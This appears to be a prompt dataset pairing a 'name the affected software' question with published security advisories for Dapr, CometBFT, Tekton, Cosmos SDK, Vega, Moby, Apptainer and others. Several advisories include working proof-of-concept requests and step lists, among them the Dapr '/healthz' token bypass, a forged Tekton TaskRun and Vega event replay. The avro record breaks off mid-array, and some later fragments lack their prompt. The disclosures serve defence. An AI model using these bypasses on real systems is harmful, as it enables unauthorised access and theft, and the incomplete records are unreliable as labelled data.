Please identify the software name affected by it. Input: ### Summary\n\n\nA vulnerability has been found in Dapr that allows bypassing [API token authentication](https://docs.dapr.io/operations/security/api-token/), which is used by the Dapr sidecar to authenticate calls coming from the application, with a well-crafted HTTP request.\n\n\nUsers who leverage API token authentication are encouraged to upgrade Dapr to 1.10.9 and 1.11.2.\n\n\n### Impact\n\n\nThis vulnerability impacts Dapr users who have configured API token authentication. An attacker could craft a request that is always allowed by the Dapr sidecar over HTTP, even if the `dapr-api-token` in the request is invalid or missing.\n\n\n### Patches\n\n\nThe issue has been fixed in Dapr 1.10.9 and 1.11.2.\n\n\n### Details\n\n\nWhen API token authentication is enabled, Dapr requires all calls from applications to include the `dapr-api-token` header, with a value matching what's included in the Dapr's configuration. In order to allow for healthchecks to work, the `/v1.0/healthz` and `/v1.0/healthz/outbound` HTTP APIs are excluded from the API token authentication check, and are always allowed.\n\n\nDapr <= 1.10.8 and <= 1.11.1 implemented the allowlisting of the healthcheck endpoints by permitting all requests whose URL contains `/healthz` to bypass the API token authentication check. The match applied anywhere in the URL, including the querystring.\n\n\nAs a consequence, attackers were able to bypass API token authentication by including `/healthz` anywhere in the URL, including as a querystring parameter. This allowed attackers to invoke any Dapr API using HTTP, including perform service invocation.\n\n\n### Proof of Concept\n\n\n```\n$ curl -v http://localhost:3500/v1.0/metadata\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 401 Unauthorized\n< Date: Mon, 17 Jul 2023 18:13:13 GMT\n< Content-Type: text/plain; charset=utf-8\n< Content-Length: 17\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\ninvalid api token\n\n\n$ curl -v http://localhost:3500/v1.0/metadata -H \"dapr-api-token: mytoken\"\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n> dapr-api-token: mytoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:26 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n\n\n$ curl -v http://localhost:3500/v1.0/metadata?foo=/healthz\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata?foo=/healthz HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:44 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n.

Please identify the software name affected by it. Input: ### Impact\n\nThe mempool maintains two data structures to keep track of outstanding transactions: a list and a map.\nThese two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. \n\nUnfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.\nBecause the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.\nThis happens  even if the duplicated transaction is later committed in a block.\nThe only way to remove the transaction is by restarting the node.\n\nThese are the steps to cause the above duplication problem. Everything should happen within one height, that is no `FinalizeBlock` or `BeginBlock` ABCI calls should happen while these steps are reproduced:\n\n1. send transaction tx1 to the target full node via RPC\n2. send N more different transactions to the target full node, where N should be higher than the node's configured value for `cache_size` in `config.toml`\n3. send transaction tx1 again to the target full node\n\nOne of the copies of tx1 is now _stuck_ in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.\n\nThe above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.\n\nThis problem is present in releases: `v0.37.0`, and `v0.37.1`, as well as in `v0.34.28`, and all previous releases of the CometBFT repo. It will be fixed in releases `v0.34.29` and `v0.37.2`.\n\n### Patches\n\nThe PR containing the fix is [here](https://github.com/cometbft/cometbft/pull/890).\n\n\n### Workarounds\n\n* Increasing the value of `cache_size` in `config.toml` makes it very difficult to effectively attack a full node.\n* Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.\n\n### References\n\n* [PR](https://github.com/tendermint/tendermint/pull/2778) that introduced the map to track transactions in the mempool.\n* [PR](https://github.com/cometbft/cometbft/pull/890) containing the fix.\n.

Input: ### Summary\nA well-crafted string passed to avro's `github.com/hamba/avro/v2.Unmarshal()` can throw a `fatal error: runtime: out of memory` which is unrecoverable and can cause denial of service of the consumer of avro.\n\n### Details\nThe root cause of the issue is that avro uses part of the input to `Unmarshal()` to determine the size when creating a new slice.\n\nIn the reproducer below, the first few bytes determine the size of the slice.\n\nThe root cause is on line 239 here:\nhttps://github.com/hamba/avro/blob/3abfe1e6382c5dccf2e1a00260c51a64bc1f1ca1/reader.go#L216-L242\n\n### PoC\nThe issue was found during a security audit of Dapr, and I attach a reproducer that shows how the issue affects Dapr.\n\nDapr uses an older version of the avro library, but it is also affected if bumping avro to latest.\n\nTo reproduce:\n```bash\ncd /tmp\ngit clone --depth=1 https://github.com/dapr/components-contrib\ncd components-contrib/pubsub/pulsar\n```\nnow add this test to the `pulsar_test.go`:\n```golang\nfunc TestParsePublishMetadata2(t *testing.T) {\n        m := &pubsub.PublishRequest{}\n        m.Data = []byte{246, 255, 255, 255, 255, 10, 255, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32,

Input: ### Summary\nPipelines do not validate child UIDs, which means that a user that has access to create TaskRuns can create their own Tasks that the Pipelines controller will accept as the child Task.\n\nWe should add UID to PipelineRun status and validate that child Run status/results only come from Runs matching the same UID. \n\n### Details\nWhile we [store and validate the PipelineRun's (api version, kind, name, uid) in the child Run's OwnerReference](https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372), we only store (api version, kind, name) in the [ChildStatusReference](https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference) .\n\nThis means that if a client had access to create TaskRuns on a cluster, they could create a child TaskRun for a pipeline with the same name + owner reference, and the Pipeline controller picks it up as if it was the original TaskRun. This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.\n\nI believe this is also true for [TaskRuns -> Pods since it looks like we only lookup by name](https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992), though I haven't tested this.\n\nIf you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)\n\n### PoC\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: PipelineRun\nmetadata:\n  name: hello-pr\nspec:\n  pipelineSpec:\n    tasks:\n      - name: task1\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                sleep 60\n      - name: task2\n        runAfter: [task1]\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                echo \"asdf\" > $(results.foo.path)\n          results:\n            - name: foo\n    results:\n      - name: foo\n        value: $(tasks.task2.results.foo)\n```\n\nOnce this is running, grab the PR UID:\n\n```sh\n$ k get pr hello-pr -o json | jq .metadata.uid -r\n```\n\nWhile pipeline is running task 1, start fake task 2:\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: TaskRun\nmetadata:\n  annotations:\n  labels:\n    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines\n    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks\n    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr\n    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr\n    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2\n  name: hello-pr-task2\n  namespace: default\n  ownerReferences:\n  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\n    blockOwnerDeletion: true\n    controller: true\n    kind: PipelineRun\n    name: hello-pr\n    uid: af549647-4532-468b-90c5-29122a408f8d <--- this should be UID of PR fetched in last step\nspec:\n  serviceAccountName: default\n  taskSpec:\n    results:\n    - name: foo\n      type: string\n    steps:\n    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n      name: echo\n      resources: {}\n      script: |\n        echo \"zxcv\" > $(results.foo.path)\n```\n\nGet pipeline results - it shows the output of the 2nd injected TaskRun\n\n```\n$ k get pr -o json hello-pr | jq .status.pipelineResults\n[\n  {\n    \"name\": \"foo\",\n    \"value\": \"zxcv\\n\"\n  }\n]\n```\n\n### Impact\n\nThis can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline. This requires access to create TaskRuns, so impact may vary depending on your Tekton setup. **If users already have unrestricted access to create any Task/PipelineRun, this does not grant any additional capabilities**.\n\nWorst case example would be a supply chain attack where a malicious TaskRun triggered from Triggers/Workflows intercepts and replaces a task in a trusted Pipeline..

Please identify the software name affected by it. Input: ### Impact\n\nA vulnerability has been identified in Weave GitOps Terraform Controller which could allow an authenticated remote attacker to view sensitive information. This vulnerability stems from Weave GitOps Terraform Runners (`tf-runner`), where sensitive data is inadvertently printed - potentially revealing sensitive user data in their pod logs. In particular, functions `tfexec.ShowPlan`, `tfexec.ShowPlanRaw`, and `tfexec.Output` are implicated when the `tfexec` object set its `Stdout` and `Stderr` to be `os.Stdout` and `os.Stderr`.\n\nAn unauthorized remote attacker could exploit this vulnerability by accessing these prints of sensitive information, which may contain configurations or tokens that could be used to gain unauthorized control or access to resources managed by the Terraform controller.\n\nA successful exploit could allow the attacker to utilize this sensitive data, potentially leading to unauthorized access or control of the system.\n\n### Patches\n\nThis vulnerability has been addressed in Weave GitOps Terraform Controller versions `v0.14.4` and `v0.15.0-rc.5`. Users are urged to upgrade to one of these versions to mitigate the vulnerability.\n\nThe patches for this vulnerability are found in:\n- this commit: 9708fda28ccd0466cb0a8fd409854ab4d92f7dca\n- this commit: 6323b355bd7f5d2ce85d0244fe0883af3881df4e\n- this commit: 28282bc644054e157c3b9a3d38f1f9551ce09074\n- and this commit: 98a0688036e9dbcf43fa84960d9a1ef3e09a69cf\n\n### Workarounds\n\nAs a temporary measure until the patch can be applied, users can add the environment variable `DISABLE_TF_LOGS` to the tf-runners via the runner pod template of the Terraform Custom Resource. This will prevent the logging of sensitive information and mitigate the risk of this vulnerability.\n\n### References\n\n- The first issue: https://github.com/weaveworks/tf-controller/issues/637\n- The second issue: https://github.com/weaveworks/tf-controller/issues/649\n\n### For More Information\n\nIf you have any further questions or comments about this advisory:\n\nOpen an issue in the Weave GitOps Terraform Controller repository\nEmail us at [security@weave.works](mailto:security@weave.works)\n.

Input: # x/crisis does not charge ConstantFee\n### Impact\nIf a transaction is sent to the `x/crisis` module to check an invariant, the ConstantFee parameter of the chain is NOT charged. All versions of the `x/crisis` module are affected on all versions of the Cosmos SDK.\n\n### Details\nThe `x/crisis` module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a `MsgVerifyInvariant` with the name of the invariant. Processing this message takes extra processing power hence a `ConstantFee` was introduced on the chain that is charged as extra from the reporter for the extra computational work. This is supposed to avert spammers on the chain making nodes do extra computations using this transaction. By not charging the `ConstantFee`, the transactions related to invariant checking are relatively cheaper compared to the computational need and other transactions.\n\nThat said, the submitter still has to pay the transaction fee to put the transaction on the network, hence using this weakness for spamming is limited by the usual mechanisms.\n\nSynthetic testing showed up to a 20% increase in CPU usage on a validator node that is spammed by hundreds of `MsgVerifyInvariant` messages which still makes this an expensive operation to carry out on a live blockchain network.\n\n### Patches\nThe `ConstantFee` charge of the `x/crisis` module will either be fixed or disabled in an upcoming regular release of the Cosmos SDK.\n\nThe `x/crisis` module was originally intended to allow chains to halt rather than continue with some unknown behavior in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential [cost of halting increases](https://github.com/osmosis-labs/osmosis/issues/570), chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks.\n\nThe SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.\n\nHence, the decision was made that the `x/crisis` module will be deprecated when new modules take over its responsibilities.\n\n### Workarounds\nThere is no workaround posted. Validators are advised to leave some extra computing room on their servers for possible spamming scenarios. (This is a good measure in any case.)\n\n### References\nSDK developer epic about invariant checking: https://github.com/cosmos/cosmos-sdk/issues/15706\n.

Please identify the software name affected by it. Input: # x/crisis does NOT cause chain halt\n\n### Impact\nIf an invariant check fails on a Cosmos SDK network and a transaction is sent to the `x/crisis` module to halt the chain, the chain does not halt. All versions of the `x/crisis` module is affected on all versions of the Cosmos SDK.\n\n### Details\nThe `x/crisis` module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a `MsgVerifyInvariant` with the name of the invariant. Processing this message is supposed to cause the nodes to panic. However, because the panic is within a transaction, it is caught by the SDK\u2019s built-in panic-recovery machinery and just treated as a normal \u201cinvalid\u201d transaction (ie. it returns a non-zero abci Code). Thus the `x/crisis` transactions don\u2019t actually cause chains to halt. If there is an invariant violation, it can be confirmed with an `x/crisis` transaction, but it won\u2019t cause any nodes to halt, they will just continue processing blocks.\n\nThat said, any node running with `start --inv-check-period X` will actually panic when it runs the periodic check (though it will still not panic just by processing an `x/crisis` transaction). Since this panic is located in EndBlock, it is not caught by the panic-recovery machinery and does actually crash the node. Presumably few if any nodes actually run with this in production because of how long the invariant checks take, and this runs all of them every `X` blocks.\n\n### Patches\nNo patches will be released.\n\nThe `x/crisis` module was originally intended to allow chains to halt rather than continue with some unknown behaviour in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential [cost of halting increases](https://github.com/osmosis-labs/osmosis/issues/570), chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks, but may not be worth halting for.\n\nIn some cases, chains have already broken the invariant calculations but have dealt with the consequences off-chain or during development. Halting these chains would be counter-productive.\n\nThe SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.\n\nHence, the decision was made that the `x/crisis` module will not be patched for chain halts. The module will be deprecated when new modules take over its responsibilities.\n\n### Workarounds\nIn case of a valid invariant check failure that requires a chain halt, the network validators are encouraged to coordinate off-chain for network halts. This has been an already established process for security patches.\n\n### References\nSDK developer epic about invariant checking: https://github.com/cosmos/cosmos-sdk/issues/15706\nPublic report: https://github.com/cosmos/cosmos-sdk/issues/15325.

Input: ### Issue\nSnowflake was informed via our bug bounty program of a command injection vulnerability in the Snowflake Golang driver via SSO browser URL authentication.\n\n### Impacted driver package: \ngosnowflake\n\n### Impacted version range: \nbefore [Version 1.6.19](https://community.snowflake.com/s/article/Go-Snowflake-Driver-Release-Notes)\n\n### Attack Scenario\nIn order to exploit the potential for command injection, an attacker would need to be successful in (1) establishing a malicious resource and (2) redirecting users to utilize the resource. The attacker could set up a malicious, publicly accessible server which responds to the SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user\u2019s local machine would render the malicious payload, leading to a remote code execution. \n\nThis attack scenario can be mitigated through URL whitelisting as well as common anti-phishing resources.  \n\n### Solution\nOn March 21, 2023, Snowflake merged a patch that fixed a command injection vulnerability in the Snowflake Golang driver via SSO browser URL authentication. The vulnerability affected the Snowflake Golang driver before Version 1.6.19. We strongly recommend users upgrade to Version 1.6.19 as soon as possible via the following resources: [Go Snowflake Driver](https://docs.snowflake.com/en/developer-guide/golang/go-driver)\n\n### Additional Information\nIf you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne.

Please identify the software name affected by it. Input: A vulnerability exists that allows a malicious validator to trick the Vega network into re-processing past Ethereum events from Vega\u2019s Ethereum bridge. For example, a deposit to the collateral bridge for 100USDT that credits a party\u2019s general account on Vega, can be re-processed 50 times resulting in 5000USDT in that party\u2019s general account. This is without depositing any more than the original 100USDT on the bridge.\n\nDespite this exploit requiring access to a validator's Vega key, a validator key can be obtained at the small cost of 3000VEGA, the amount needed to announce a new node onto the network.\n\nThe steps to carry out this exploit are as follows:\n1. Cause an Ethereum event on one of the bridge contracts e.g a deposit to the collateral bridge, or the staking bridge\n2. This will result in the Ethereum-event-forwarder of each node to submit a ChainEvent transaction to the Vega network corresponding to that event\n3. Scrape the valid chain event transaction from the Tendermint block data using a node\u2019s Tendermint API\n4. Change the value of the `txId` field of the ChainEvent to any valid, but different, value\n5. Bundle the tweaked ChainEvent into a new transaction, sign it with a validator key and resubmit to the Vega network\n6. The fraudulent ChainEvent will be processed by Vega as if it were a new ChainEvent even though it did not occur on Ethereum\n\nThe key to this exploit is in step 4. The `txId` field of the ChainEvent is used when checking for ChainEvent resubmission, but NOT during the subsequent on-chain verification of the event. Therefore changing the `txId` of an existing ChainEvent is enough to by-pass the duplication check and for it to still be verified as a real event.\n\n### Impact\nThe impact of this exploit is dependent on the ChainEvent being manipulated. The below table describes each one:\n\n| Chain Event  | Allows | Consequence |\n| ------------- | ------------- | ------------- |\n| Deposit | Generation of unlimited funds of any asset  | Withdrawal of all assets |\n| Stake Deposit  | Delegate unlimited Vega to a single node  | A single node has controlling amount of voting power  |\n| Stake Removed  | Force a Validator node to drop below self-stake requirements  | Prevents reward payouts  |\n| Bridge Stop  | The Vega network to think the bridge is stopped  | Prevent anyone from withdrawing funds  |\n| Signer Removed  | The Vega network to think a validator nodes is not on the multisig contract  | Prevent reward payouts  |\n\n### Patches\nv0.71.6\n\n### Workarounds\nNo work around known, however there are mitigations in place should this vulnerability be exploited:\n\n- there are monitoring alerts, for `mainnet1`, in place to identify any issues of this nature including this vulnerability being exploited\n- the validators have the ability to stop the bridge thus stopping any withdrawals should this vulnerability be exploited\n\n### References\nN/A\n.

Please identify the software name affected by it. Input: [Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\nThe `overlay` driver dynamically and lazily defines the kernel configuration for the VXLAN network on each node as containers are attached and detached. Routes and encryption parameters are only defined for destination nodes that participate in the network. The iptables rules that prevent encrypted overlay networks from accepting unencrypted packets are not created until a peer is available with which to communicate.\n\n## Impact\nEncrypted overlay networks silently accept cleartext VXLAN datagrams that are tagged with the VNI of an encrypted overlay network. As a result, it is possible to inject arbitrary Ethernet frames into the encrypted overlay network by encapsulating them in VXLAN datagrams. The implications of this can be quite dire, and [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw) should be referenced for a deeper exploration.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* In multi-node clusters, deploy a global \u2018pause\u2019 container for each encrypted overlay network, on every node. For example, use the `registry.k8s.io/pause` image and a `--mode global` service.\n* For a single-node cluster, do not use overlay networks of any sort. Bridge networks provide the same connectivity on a single node and have no multi-node features.\nThe Swarm ingress feature is implemented using an overlay network, but can be disabled by publishing ports in `host` mode instead of `ingress` mode (allowing the use of an external load balancer), and removing the `ingress` network.\n* If encrypted overlay networks are in exclusive use, block UDP port 4789 from traffic that has not been validated by IPSec. For example, `iptables -A INPUT -m udp \u2014-dport 4789 -m policy --dir in --pol none -j DROP`.\n\n## Background\n* This issue was discovered while characterizing and mitigating [CVE-2023-28840](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp) and [CVE-2023-28841](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237).\n\n## Related\n* [CVE-2023-28841: Encrypted overlay network traffic may be unencrypted](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237)\n* [CVE-2023-28840: Encrypted overlay network may be unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork).

Please identify the software name affected by it. Input: ### Impact\nThere is an ext4 use-after-free flaw described in CVE-2022-1184 that is exploitable through versions of Apptainer < 1.1.0 and installations that include apptainer-suid < 1.1.8 on older operating systems where that CVE has not been patched.  That includes Red Hat Enterprise Linux 7, Debian 10 buster (unless the linux-5.10 package is installed), Ubuntu 18.04 bionic and Ubuntu 20.04 focal.  Use-after-free flaws in the kernel can be used to attack the kernel for denial of service and potentially for privilege escalation.\n\n### Background\nHistorically there have been many CVEs published for extfs and a smaller number for squashfs, including serious use-after-free and buffer overrun vulnerabilities, that are scored as \"Moderate\" or \"Low\" impact only because unprivileged users were assumed to not have write access to the raw data.  Because of those ratings, vendors treat such CVEs as low urgency and either delay a patch until their next major release or never patch older but still supported operating systems at all.  Many Linux distributions automatically mount user-writable USB-drive volumes, but those are considered low risk because they require physical access to the machine.  However, since setuid-root installations of Apptainer by default allow all users to mount any extfs (specifically, ext3, which is implemented by the ext4 driver) and squashfs filesystem using kernel drivers even though the users have write access to the raw data, the setuid-root installations raise the severity of such unpatched CVEs.  \n\nCVE-2022-1184 is currently such an unpatched CVE, at least on the above listed operating systems.  The descriptions from the operating system vendors about the CVE (referenced below) are incomplete, saying only that it allows a local attacker with user privilege to cause a denial of service.  Normally users would not be able to cause it because they cannot modify the filesystem image, and normally vulnerabilities that involve kernel memory corruption by unprivileged users are considered high severity even when there is not yet a known privilege escalation because someone with sufficient kernel knowledge can usually turn such a corruption into a privilege escalation. \n\nRed Hat did not list RHEL7 as vulnerable, but they also did not list it as unaffected, and testing confirmed that a filesystem image could be corrupted to get past the check inserted into the filesystem driver to fix the vulnerability (patches linked below).\n\nAll published squashfs CVEs have been patched in currently supported major operating systems.\n\n### Patches\nApptainer 1.1.8 includes a patch that by default disables mounting of extfs filesystem types in setuid-root mode, while continuing to allow mounting of extfs filesystems in non-setuid \"rootless\" mode using fuse2fs.\n\n### Workarounds\nThese workarounds are possible:\n1. Either do not install apptainer-suid (for versions 1.1.0 through 1.1.7) or set `allow setuid = no` in apptainer.conf.  This requires having unprivileged user namespaces enabled and except for apptainer 1.1.x versions will disallow mounting of sif files, extfs files, and squashfs files in addition to other, less significant impacts.  (Encrypted sif files are also not supported unprivileged in apptainer 1.1.x.)\n2. Alternatively, use the `limit containers` options in apptainer.conf/singularity.conf to limit sif files to trusted users, groups, and/or paths.  (The option `allow container extfs = no` disallows mounting extfs overlay files but does not disallow mounting of extfs overlay partitions inside SIF files, so it does not help work around the problem.)\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-1184\nhttps://access.redhat.com/security/cve/cve-2022-1184\nhttps://security-tracker.debian.org/tracker/CVE-2022-1184\nhttps://ubuntu.com/security/CVE-2022-1184\nKernel patches for CVE-2022-1184:\nhttps://github.com/torvalds/linux/commit/65f8ea4cd57dbd46ea13b41dc8bac03176b04233\nhttps://github.com/torvalds/linux/commit/61a1d87a324ad5e3ed27c6699dfc93218fcf3201\n\n------\n\n## Addendum 30 May 2023\n\nNew information has become available: many ext4 filesytem vulnerabilities similar to the one in CVE-2022-1184 continue to be found, and most of them do not ever have a CVE assigned.  The way to locate them is to search for \"syzbot\" in linux kernel commit messages under fs/ext4.  \"syzbot\" is a public automated system for finding kernel bugs.  Especially when syzbot reports are labeled \"KASAN\" (Kernel Address Sanitizer) and especially if they involve memory corruption including \"use after free\", \"out of bounds\", or \"user-memory-access\", they are vulnerabilities that can potentially be turned into privilege escalation when an unprivileged user has write access to the underlying data.\n\nIn particular there are two such commits from this month, May 2023, referenced below.  They both have commit messages describing a situation of write access to the underlying data while the kernel has that data mounted as a filesystem.  These commits have been backported to currently maintained kernel lines in versions 4.19.293 and 5.4.243, but since they are considered moderate severity, most common OS distributions do not include them immediately.  For example since RHEL9.2 was recently announced, they are not likely to be available in RHEL9 until 9.3 is released in about another 6 months.  Therefore if system administrators want to be protected against these vulnerabilities while still allowing ext4 filesystem mounts through setuid-root apptainer, they should watch for these types of commits and whenever such commits are released the administrators should update to the latest currently maintained kernel version (bypassing their OS vendor's distribution) and reboot.\n\nhttps://github.com/torvalds/linux/commit/2220eaf90992c11d888fe771055d4de3303\nhttps://github.com/torvalds/linux/commit/4f04351888a83e595571de672e0a4a8b74f\nhttps://lwn.net/Articles/932137/\nhttps://lwn.net/Articles/932136/.

The rules are appended to the end of the `INPUT` filter chain, following any rules that have been previously set by the system administrator. Administrator-set rules take precedence over the rules Moby sets to discard unencrypted VXLAN datagrams, which can potentially admit unencrypted datagrams that should have been discarded.\n\nOn Red Hat Enterprise Linux and derivatives such as CentOS and Rocky, the `xt_u32` module has been:\n* [moved to the kernel-modules-extra package and no longer installed by default in RHEL 8.3](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.3_release_notes/rhel-8-3-0-release#technology-preview_networking)\n* [officially deprecated in RHEL 8.6](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.6_release_notes/deprecated_functionality#deprecated-functionality_networking)\n* [removed completely in RHEL 9](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/assembly_networking_considerations-in-adopting-rhel-9#ref_firewall-networking_assembly_networking)\n\nThese rules are not created when `xt_u32` is unavailable, even though the container is still attached to the network.\n\n## Impact\nEncrypted overlay networks on affected configurations silently accept cleartext VXLAN datagrams that are tagged with the VNI of an encrypted overlay network. As a result, it is possible to inject arbitrary Ethernet frames into the encrypted overlay network by encapsulating them in VXLAN datagrams.\n\nThe injection of arbitrary Ethernet frames can enable a Denial of Service attack. A sophisticated attacker may be able to establish a UDP or TCP connection by way of the container\u2019s outbound gateway that would otherwise be blocked by a stateful firewall, or carry out other escalations beyond simple injection by smuggling packets into the overlay network.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24.

Example minimal config:\n\n```yaml\n- id: 'example'\n  upstream:\n    url: 'https://example.com'\n  match:\n    url: 'http://127.0.0.1:4455/'\n    methods:\n      - GET\n  authenticators:\n    - handler: anonymous\n  authorizer:\n    handler: allow\n  mutators:\n    - handler: header\n      config:\n        headers:\n          X-Subject: {{ .Subject }}\n```\n\n```\ncurl -H \"Connection: close,x-subject\" http://127.0.0.1:4455/\n```\n\nThe `X-Subject` header will not arrive at the downstream server. It is completely dropped. In case the downstream server handles such a request in an unexpected way, an attacker can exploit this, assuming they know or guess the internal header name.\n\n### Patches\n\nc5cc7f736dc84185034be4356057d1c7a656d797\n\n### Workarounds\n\nThe downstream server should handle the case that an expected header is not set by responding with an appropriate error.\n\n### References\n\nSee background info in https://github.com/golang/go/issues/50580.

